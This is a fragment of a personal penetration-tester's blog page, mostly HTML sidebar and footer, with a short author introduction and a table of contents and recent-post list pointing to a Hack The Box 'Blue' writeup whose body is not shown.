I’ve been in the cybersecurity industry for over 3 years, starting my journey in the trenches of a SOC (Security Operations Center) before transitioning to the offensive side as a Penetration Tester. Why this blog?In this industry, the learning never stops. I’ve spent countless hours grinding through certifications like OSCP, PNPT, and CPTS. I’ve spent even more hours staring at terminal screens, deb...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/mash.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">TamaGorengs</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">3</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/TamaGorengs"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/TamaGorengs" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://twitter.com/tamagor3ngs" target="_blank" title="Twitter"><i class="fab fa-twitter" style="color: #1DA1F2;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">1% better everyday</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Reconnaissance"><span class="toc-number">1.</span> <span class="toc-text">Reconnaissance</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration"><span class="toc-number">2.</span> <span class="toc-text">Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Access"><span class="toc-number">3.</span> <span class="toc-text">Initial Access</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Capture-the-Flags"><span class="toc-number">4.</span> <span class="toc-text">Capture the Flags</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Beyond-Root"><span class="toc-number">5.</span> <span class="toc-text">Beyond Root</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/02/04/HTB-Blue-Writeup/" title="HTB Blue Writeup"><img src="/2026/02/04/HTB-Blue-Writeup/htb-blue.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HTB Blue Writeup"/></a><div class="content"><a class="title" href="/2026/02/04/HTB-Blue-Writeup/" title="HTB Blue Writeup">HTB Blue Writeup</a><time datetime="2026-02-04T15:22:17.000Z" title="Created 2026-02-04 23:22:17">2026-02-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/02/04/Hello-World-Why-Tamago-Security/" title="Hello World: Why Tamago Security?"><img src="/img/guts.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Hello World: Why Tamago Security?"/></a><div class="content"><a class="title" href="/2026/02/04/Hello-World-Why-Tamago-Security/" title="Hello World: Why Tamago Security?">Hello World: Why Tamago Security?</a><time datetime="2026-02-04T12:09:40.000Z" title="Created 2026-02-04 20:09:40">2026-02-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/02/04/Welcome/" title="Welcome to Tamago Security"><img src="/img/guts.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Welcome to Tamago Security"/></a><div class="content"><a class="title" href="/2026/02/04/Welcome/" title="Welcome to Tamago Security">Welcome to Tamago Security</a><time datetime="2026-02-04T12:00:00.000Z" title="Created 2026-02-04 20:00:00">2026-02-04</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/2026/02/04/HTB-Blue-Writeup/htb-blue.png);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2026 By TamaGorengs</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4"></script><script src="/js/main.js?v=5.5.4"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>